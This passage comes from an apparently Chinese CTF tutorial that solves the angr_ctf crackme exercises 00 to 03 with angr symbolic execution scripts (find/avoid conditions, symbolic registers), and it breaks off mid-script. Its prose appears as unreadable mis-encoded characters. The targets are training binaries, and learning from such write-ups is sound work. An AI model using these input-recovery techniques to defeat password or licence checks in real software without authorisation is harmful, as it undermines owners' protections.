punctuation">(</span><span class="token string">"[+] Success! Solution is: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÊúÄÂêéÊâßË°å scaffold00.py ÂæóÂà∞ÈúÄË¶ÅËæìÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤‚ÄùJXWVXRKX‚ÄùÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427000053246.png" alt="image-20220427000053246"></p><h1 id="Part-1-angr-find-condition"><a href="#Part-1-angr-find-condition" class="headerlink" title="Part 1 angr find condition"></a>Part 1 angr find condition</h1><p>Âú®‰∏äÈù¢ÁÆÄÂçïÁöÑËÆ§ËØÜ‰∫Ü‰∏Ä‰∏ã angrÔºåÊé•‰∏ãÊù•Â≠¶‰π†Â¶Ç‰ΩïÈÅøÂÖç‰∏çÈúÄË¶ÅÁöÑÁä∂ÊÄÅ‰ª•ÂáèÂ∞ëÁ¨¶Âè∑ÊâßË°åÁöÑÊó∂Èó¥„ÄÇÂÖàË∑≥Ëøá 01_angr_avoidÔºåÂõ†‰∏∫ÂÆÉÂíå‰∏äÈù¢ÁöÑÈ¢òÁõÆÊòØ‰∏ÄÊ†∑ÁöÑÔºå‰ΩÜÈúÄË¶ÅÊàë‰ª¨ÊåáÂÆöÂíåÈÅøÂÖçÊüê‰∫õË∑ØÂæÑÔºåÂèØ‰ª•ÂÄü 02_angr_find_condition Êù•Â≠¶‰π† angr ÁöÑ avoid ÂäüËÉΩ„ÄÇÁî® IDA ÊâìÂºÄ‰∫åËøõÂà∂Êñá‰ª∂ÔºåÂèØ‰ª•ÂèëÁé∞ÊúâÂæàÂ§öÂùóÈÉΩ‰ºöÊâìÂç∞‚ÄúGood Job‚ÄùÊàñ‚ÄúTry again‚ÄùÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427105401322.png" alt="image-20220427105401322"></p><p>ËÆ∞ÂΩïÊâÄÊúâÁöÑËøô‰∫õÂùóËµ∑ÂßãÂú∞ÂùÄ‰∏çÂ§™Áé∞ÂÆûÔºåÊï∞ÈáèÂ§™Â§ö‰∫ÜÔºå‰ΩÜÂèØ‰ª•Ê†πÊçÆÂÆÉÊâìÂç∞Âà∞Ê†áÂáÜËæìÂá∫ÁöÑÂÜÖÂÆπÂëäËØâ angr ‰øùÁïôÊàñ‰∏¢ÂºÉ„ÄÇÊâìÂºÄ scaffold02.py Êñá‰ª∂Ôºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ???  <span class="token comment"># :boolean</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ???  <span class="token comment"># :boolean</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>‰ª£Á†ÅÂ§ßÈÉ®ÂàÜÈÉΩÂíåÂâç‰∏Ä‰∏™‰æãÂ≠êÁõ∏ÂêåÔºåÂ∞±‰∏çËµòËø∞‰∫Ü„ÄÇ‰∏ªË¶ÅÁúã‰∏≠Èó¥ÈÉ®ÂàÜÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>   stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> ???  <span class="token comment"># :boolean</span>  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>   stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> ???  <span class="token comment"># :boolean</span> simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÁåúÊµã <code>is_successful()</code> ÂØπÁä∂ÊÄÅËøõË°åÊ£ÄÊµãÔºåÊ£ÄÊµãÂÆÉÁöÑÁªìÊûúÊòØÂê¶ËæìÂá∫ ‚ÄúGood Job‚Äù„ÄÇÊ†πÊçÆÂàÜÊûê‰øÆÊîπ‰ª£Á†ÅÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token string">b'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>     <span class="token keyword">return</span> <span class="token boolean">True</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>       <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÁÑ∂ÂêéÂÜç‰øÆÊîπ <code>should_abort()</code> ÂáΩÊï∞ÔºåÂèØ‰ª•ÁúãÂá∫Êù•Âíå <code>is_successful()</code> ÂäüËÉΩÁõ∏ÂêåÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> <span class="token string">b'Try again.'</span> <span class="token keyword">in</span>  stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>simulation.explore(find=is_successful, avoid=should_abort)</code> ÂëäËØâ angrÔºåÂè™ÂØπ‚ÄùGood Job‚ÄùÊÑüÂÖ¥Ë∂£ÔºåË¶ÅÈÅøÂÖç‚ÄùTry again‚ÄùÁöÑË∑ØÂæÑ„ÄÇ<code>find</code> Âíå <code>avoid</code> ÂèÇÊï∞ÂèØ‰ª•ÊòØ‰∏Ä‰∏™Âú∞ÂùÄÊàñÂú∞ÂùÄÂàóË°®„ÄÇ</p><p>ÊúÄÂêéÂÆåÊï¥‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">"./02_angr_find_condition"</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> <span class="token string">b'Try again.'</span> <span class="token keyword">in</span>  stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">False</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Success! Solution is: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÊúÄÂêéÂæàÂø´ÂæóÂà∞ÁªìÊûú‚ÄùHETOBRCU‚Äù</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427111953296.png" alt="image-20220427111953296"></p><h1 id="Part-2-angr-symbolic-registers"><a href="#Part-2-angr-symbolic-registers" class="headerlink" title="Part 2 angr symbolic registers"></a>Part 2 angr symbolic registers</h1><p>Áé∞Âú®ËÄÉËôë‰∏ÄÁßçÊÉÖÂÜµÔºåÂ¶ÇÊûú angr Êó†Ê≥ï‰ªéÊåáÂÆöÁöÑÂú∞ÂùÄÂºÄÂßãÁ¨¶Âè∑ÊâßË°åËØ•Â¶Ç‰ΩïÂ§ÑÁêÜÔºüÊç¢‰∏™ËØ¥Ê≥ïÔºåangr Âú®Â§ÑÁêÜÁ±ª‰ºº <code>scanf(&quot;%x %x %x&quot;, &amp;a, &amp;b, &amp;c)</code> ËøôÁßçËæìÂÖ•ÊñπÂºèÁöÑÊó∂ÂÄôÂ∞§‰∏∫ÂêÉÂäõÔºåÂ∞±ÂæóËÄÉËôëÂè¶Â§ñ‰∏ÄÁßçÂäûÊ≥ï„ÄÇÊàë‰ª¨ÂèØ‰ª•Ë∑≥ËøáËøô‰∏™ËæìÂÖ•ÂáΩÊï∞ÔºåÂú®Áî®Âà∞ËæìÂÖ•ÂèÇÊï∞ÁöÑÊó∂ÂÄôÊàë‰ª¨Ëá™ÂÆö‰πâÂØÑÂ≠òÂô®ÁöÑÂÄºÔºåËøôÊ†∑Â∞±ÂèØ‰ª•ËææÂà∞Êàë‰ª¨ÁöÑÁõÆÁöÑ„ÄÇ</p><p>È¶ñÂÖàËÄÅËßÑÁü©ÔºåÂÖàÂú® IDA ÁúãÁúã‰∫åËøõÂà∂Á®ãÂ∫è 03_angr_symbolic_registers„ÄÇ‰∏ªÂáΩÊï∞‰∏≠ <code>get_user_input</code> Êé•Êî∂Áî®Êà∑ËæìÂÖ•ÔºåÂ∞ÜÁî®Êà∑ËæìÂÖ•ÁªèËøá <code>complex_function</code> ÁöÑÂ§ÑÁêÜÔºåÊúÄÂêéËæìÂá∫‚ÄùGood Job‚ÄùÊàñ‚ÄùTry again‚ÄùÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427140721086.png" alt="image-20220427140721086"></p><p>ÂÜçÁúãÁúã <code>get_user_input</code> ÂáΩÊï∞ÔºåÊ≠£Â¶Ç‰∏äÈù¢ËØ¥ÁöÑÈÇ£Ê†∑Ôºå‰ΩøÁî® <code>scanf</code> ËøôÁßçÂ§çÊùÇÁöÑÊñπÂºèÊé•ÂèóËæìÂÖ•„ÄÇÂÆÉÂ∞ÜÂèÇÊï∞‰æùÊ¨°Áªô‰∫Ü EAX„ÄÅEBX„ÄÅEDXÂØÑÂ≠òÂô®Ôºå‰∫ÜËß£ÂèÇÊï∞‰º†ÈÄíÁöÑÂØÑÂ≠òÂô®ÊúâÂà©‰∫é‰ΩøÁî® angr ËøõË°åÂèÇÊï∞Ê®°ÊãüÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427141347745.png" alt="image-20220427141347745"></p><p>ÁÑ∂ÂêéÊü•Áúã scaffold03.py ‰ª£Á†ÅÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  start_address <span class="token operator">=</span> ???  <span class="token comment"># :integer (probably hexadecimal)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>    password0_size_in_bits <span class="token operator">=</span> ???  <span class="token comment"># :integer</span>  password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> password0_size_in_bits<span class="token punctuation">)</span>    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>??? <span class="token operator">=</span> password0  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ???  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ???  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>se<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    solution <span class="token operator">=</span> ???  <span class="token comment"># :string</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>      <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>È¶ñÂÖà <code>start_address</code> ‰æùÁÑ∂ËÆæÁΩÆÊàë‰ª¨Â∏åÊúõÁöÑËµ∑ÂßãÂú∞ÂùÄÔºå‰πüÂ∞±ÊòØË∞ÉÁî® <code>scanf</code> ‰πãÂêéÁöÑÂú∞ÂùÄ 0x08048937„ÄÇÁÑ∂ÂêéÊ≥®ÊÑèËøôÈáåÊòØ‰ΩøÁî®ÁöÑ <code>blank_state</code> ËÄå‰∏çÊòØ <code>entry_state</code>ÔºåÂÆûÈôÖ‰∏äÊòØÂëäËØâ angr Âú®ËØ•Âú∞ÂùÄÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑ state„ÄÇ<code>claripy.BVS</code> Ë°®Á§∫‰ΩøÁî® claripy ‰∏≠ÁöÑ <code>BVS</code> ÊñπÊ≥ïÁîüÊàê‰ΩçÂêëÈáèÔºåÂÆÉÊúâ‰∏§‰∏™ÂèÇÊï∞ÔºåÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞‚Äùpassword0‚ÄùÂ∞±ÂÉèÊòØÊñπÁ®ãÈáåÈù¢ÁöÑÁ¨¶Âè∑‚Äúx‚ÄùÔºåÁ¨¨‰∫å‰∏™ÂèÇÊï∞ <code>password0_size_in_bits</code> Ë°®Á§∫ÊâÄÁî®ÁöÑÊï∞ÂÄºÁöÑ‰∫åËøõÂà∂‰ΩçÊï∞Ôºå<code>int</code> ÂûãÂ∞±ÊòØ32‰Ωç„ÄÇ<code>initial_state.regs</code> Â∞Ü‰ΩøÁî®ÂàõÂª∫ÁöÑ‰ΩçÂêëÈáèÔºåÂ∞ÜÂÄºÊåáÂÆöÁªôÂØÑÂ≠òÂô®„ÄÇ‰πãÂêéÂÆö‰πâ <code>find</code> Âíå <code>avoid</code> Áä∂ÊÄÅ„ÄÇ<code>solution_state.se.eval</code> ÊñπÊ≥ïÂèØ‰ª•Áúã‰ΩúÊòØÊ±ÇËß£ÂÆö‰πâÁöÑ‰ΩçÂêëÈáèÔºåÊúÄÂêéÊâìÂç∞Ê±ÇËß£ÁöÑÁªìÊûú„ÄÇ</p><p>‰æùÁÖß‰∏äÈù¢ÂàÜÊûêÁöÑÁªìÊûú‰øÆÊîπ‰ª£Á†ÅÔºå‰ΩÜÊòØÊúâ‰∏Ä‰∏™ÈóÆÈ¢òÔºåÈÇ£Â∞±ÊòØÂú®Êàë‰ª¨ÁöÑËµ∑ÂßãÂú∞ÂùÄÂú® <code>scanf</code> ÂáΩÊï∞‰πãÂêéÔºåÂáΩÊï∞ËøîÂõûÈúÄË¶ÅÂπ≥Ë°°Ê†àÔºå‰πüÂ∞±ÊòØËØ¥ËøòÂæó‰º™ÈÄ†‰∏Ä‰∏™Ê†àÁöÑÂÜÖÂÆπ„ÄÇÂÖ∂ÂÆûËøôÂ∞±ÊúâÁÇπËøá‰∫éÂ§çÊùÇ‰∫ÜÔºåÂÜçÊ¨°ËßÇÂØü‰ª£Á†ÅÂèØ‰ª•ÂæóÁü•Âú® <code>get_user_input</code> ÂáΩÊï∞ËøîÂõû‰πãÂêéÂ∞ÜÂèÇÊï∞ÁªôÂà∞‰∫Ü EAX„ÄÅEBX„ÄÅEDXÔºåÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•‰ªéËøôÈáåÂºÄÂßãÁªôÂØÑÂ≠òÂô®ËµãÂÄºÂ∞±Ë°å‰∫ÜÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220427144214207.png" alt="image-20220427144214207"></p><p>ÂÆåÊï¥‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">"./03_angr_symbolic_registers"</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  start_address <span class="token operator">=</span> <span class="token number">0x08048980</span>  <span class="token comment"># :integer (probably hexadecimal)</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>  password_size_in_bits <span class="token operator">=</span> <span class="token number">32</span>  <span class="token comment"># :integer</span>  password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> password_size_in_bits<span class="token punctuation">)</span>  password1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password1'</span><span class="token punctuation">,</span> password_size_in_bits<span class="token punctuation">)</span>  password2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password2'</span><span class="token punctuation">,</span> password_size_in_bits<span class="token punctuation">)</span>    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> password0  initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebx <span class="token operator">=</span> password1  initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>edx <span class="token operator">=</span> password2  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Good Job.\n'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Try again.\n'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution0 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token 